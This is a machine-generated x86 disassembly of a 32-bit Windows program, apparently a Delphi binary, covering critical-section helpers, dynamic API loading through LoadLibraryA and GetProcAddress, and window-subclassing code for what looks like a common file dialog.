add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
cmc
inc edx
add [ eax + eax ] bl
add [ eax ] al
xor al 0xf5
inc edx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0xa ] cl
inc edx
add [ eax - 0xa ] bh
inc edx
add [ esi + esi * 8 + 0x54100042 ] al
inc ebx
jb r-xdata
std
dec [ ebx - 0x31d7f2d ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
mov edx ebx
and dl 0xfc
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sub_42f608
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031bc
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_42f648
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_42f6a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f6c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f6cc
retn
sub_42f6d8
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_42f690
xor eax eax
push ebp
push sub_42f88f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f896
mov eax [ rw-data ]
call sub_42f698
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_42f898
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_42f690
xor eax eax
push ebp
push sub_42fc4b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fc52
mov eax [ rw-data ]
call sub_42f698
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42fffc
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_430024
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43006c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430073
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_4031ec
call sub_42f6d8
cmp [ rw-data ] 0x0
jg r-xdata
sub_430094
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4300b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4300c0
retn
sub_4300cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4300f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4300f8
retn
sub_430104
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430129
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430130
retn
sub_43013c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430161
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430168
retn
sub_430174
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430199
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4301a0
retn
sub_4301ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4301d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4301d8
retn
sub_43024a
call [ eax + 0x33ec8b55 ]
rcl [ ebp + 0x68 ] 0x71
add al [ ebx ]
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430278
retn
sub_4302c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4302e9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4302f0
retn
sub_4302fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430321
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430328
retn
sub_431d28
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4734a8
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_46fa48
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_46fa48
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_4731ac
mov edi eax
mov eax ebx
call sub_473190
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_473178
mov edi eax
mov eax ebx
call sub_4731c4
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_431ddc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_431d28
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_431e44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4212ec
mov [ esi + 0x30 ] 0x1
push esi
push sub_431f20
call sub_42237c
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_431e8c
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421338
test bl bl
jle r-xdata
call sub_422414
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_431ec0
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_475e9c
mov cl 0x1
sub_431ee8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_40343c
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_431f20
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_431f4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431fb8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_46c878
mov [ ebp - 0x14 ] eax
call sub_46c794
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_43207b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47578c
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_43204d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432054
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4757e8
retn
sub_432054
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432082
mov eax [ ebp - 0x14 ]
call sub_46c92c
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_46c79c
retn
sub_4320b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x110
jne r-xdata
cmp ebx 0x4e
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x3c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push esi
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
push edi
mov eax [ ebp + 0x10 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
cmp [ edi + 0x8 ] 0xfffffda7
jne r-xdata
push 0xfffffff8
push esi
call GetWindowLongA
call sub_431d28
sub_432138
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_431e44
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ esi + 0x58 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x5c ] eax
mov al [ r-xdata ]
mov [ esi + 0xb0 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ esi + 0x7c ] eax
mov [ esi + 0x64 ] 0x1
mov [ esi + 0x80 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4321b1
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x7c ]
call sub_4031ec
mov eax [ esi + 0x58 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_431e8c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4321ec
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_432874
mov eax edi
mov si 0xffed
call sub_4033e8
mov ebx eax
mov eax [ edi + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_432214
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx ]
cmp eax 0x110
jne r-xdata
cmp eax 0x4e
jne r-xdata
test [ edi + 0x5e ] 0x1
je r-xdata
mov edx ebx
mov eax edi
call sub_431f6c
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
add eax 0x260
cmp eax 0x7
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_432258 ]
mov edx [ esi + 0xc ]
mov eax edi
call sub_4321ec
test al al
jne r-xdata
mov eax edi
mov si 0xffee
call sub_4033e8
jmp r-xdata
mov eax edi
mov si 0xffec
call sub_4033e8
jmp r-xdata
mov eax edi
mov si 0xffeb
call sub_4033e8
jmp r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
cmp eax [ edi + 0x68 ]
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax 0x1
mov [ ebx + 0xc ] eax
push eax
push 0x0
mov eax [ edi + 0x3c ]
push eax
call SetWindowLongA
jmp r-xdata
mov [ edi + 0x68 ] eax
mov eax edi
mov si 0xffea
call sub_4033e8
jmp r-xdata
mov [ esp ] 0x1
mov ecx esp
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax edi
mov si 0xffe9
call sub_4033e8
xor eax eax
mov al [ esp ]
mov [ ebx + 0xc ] eax
sub_432310
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
sub_432398
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4323ca
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xchg edx eax
call sub_41d440
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4323d1
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_4323d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_421664
push ebx
push sub_432398
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_432418
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_403f7c
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov ecx r-xdata
mov edx esi
call sub_404288
mov eax [ ebx ]
call sub_40443c
mov dl 0x7c
call sub_40c9bc
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
mov dl 0x7c
call sub_40c9bc
test eax eax
jne r-xdata
sub_432468
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_432719
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0x68 ]
xor ecx ecx
mov edx 0x58
call sub_402bf8
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
mov [ ebp - 0x68 ] 0x4c
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
mov [ ebp - 0x68 ] 0x58
jmp r-xdata
mov [ ebp - 0x48 ] 0x104
mov [ ebp - 0x48 ] 0xffef
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x60 ]
call sub_432418
mov eax [ ebp - 0x8 ]
call sub_40443c
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x68 ] eax
test [ ebx + 0x5c ] 0x40
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_40443c
mov [ ebp - 0x3c ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x2
lea eax [ ebp - 0xc ]
call sub_4045c8
mov eax [ ebp - 0xc ]
call sub_40443c
mov esi eax
mov [ ebp - 0x4c ] esi
mov edx [ ebp - 0x48 ]
add edx 0x2
mov eax esi
xor ecx ecx
call sub_402bf8
mov eax [ ebx + 0x78 ]
call sub_40443c
mov edx eax
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x4c ]
call sub_4089f8
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5c ] edx
mov eax r-xdata
mov [ ebp - 0x3c ] eax
jmp r-xdata
inc eax
add esi 0x4
cmp al 0x16
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x34 ] edx
mov eax [ ebx + 0x70 ]
call sub_40443c
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x20
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov esi rw-data
mov edx eax
cmp dl 0x1f
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ ebp - 0x34 ] 0xfff7ffff
xor [ ebp - 0x34 ] 0x80000
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x32 ] 0x8
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_40443c
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x78 ]
call sub_408870
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_4044dc
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x74 ]
call sub_404014
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x24 ] sub_431ddc
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0xb0 ] edx
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x24 ] sub_4320b4
inc eax
add esi 0x4
cmp al 0x1
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov esi eax
test esi esi
je r-xdata
or [ ebp - 0x34 ] 0x40
mov [ ebp - 0x20 ] eax
mov edx eax
cmp dl 0x7
ja r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432720
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fa0
retn
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_432874
test [ ebp - 0x33 ] 0x4
je r-xdata
and [ ebx + 0x5c ] 0xffffff7f
or [ ebx + 0x5c ] 0x80
jmp r-xdata
and [ ebx + 0x5c ] 0xfffffffe
or [ ebx + 0x5c ] 0x1
jmp r-xdata
test [ ebp - 0x34 ] 0x1
je r-xdata
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x64 ] eax
sub_43272c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x1 ]
mov eax esi
call sub_40c9bc
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebx
sub ecx esi
mov eax edi
mov edx esi
call sub_40406c
inc ebx
mov eax edi
mov edx esi
call sub_404174
mov eax esi
call sub_408980
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_432774
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_432859
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43272c
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43272c
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4087b8
cmp [ eax ] 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404244
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432860
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_43272c
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
